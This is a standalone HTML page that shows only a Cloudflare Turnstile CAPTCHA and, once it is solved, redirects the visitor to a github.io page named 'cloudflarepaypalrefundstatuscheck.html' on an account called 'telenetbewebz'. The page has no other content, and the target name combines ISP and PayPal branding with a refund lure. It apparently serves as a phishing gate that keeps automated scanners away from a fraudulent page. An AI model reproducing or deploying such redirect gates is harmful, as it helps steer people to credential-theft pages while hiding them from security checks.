<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Cloudflare Turnstile Redirect</title>
  <!-- Load the Cloudflare Turnstile API -->
  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>

  <style>
    body, html {
      height: 100%;
      margin: 0;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: flex-start; /* Move content to the top */
    }

    .container {
      text-align: center;
      margin-top: 20px; /* Add spacing from the top */
    }

    .cf-turnstile {
      margin: 0 auto;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2></h2>
    
    <!-- Cloudflare Turnstile widget -->
    <div class="cf-turnstile" data-sitekey="0x4AAAAAAA3ze7tLFcS2RZ7I" data-callback="onTurnstileSuccess"></div>
  </div>

  <script>
    // Callback for successful CAPTCHA completion
    function onTurnstileSuccess(token) {
      console.log('Turnstile challenge succeeded, token:', token);

      // After 2 seconds, redirect to another page
      setTimeout(function() {
        window.location.href = "https://telenetbewebz.github.io/ljdnchj/cloudflarepaypalrefundstatuscheck.html";
      }, 2000);
    }
  </script>

  <noscript>
    <p>Please enable JavaScript to proceed.</p>
  </noscript>
</body>
</html>
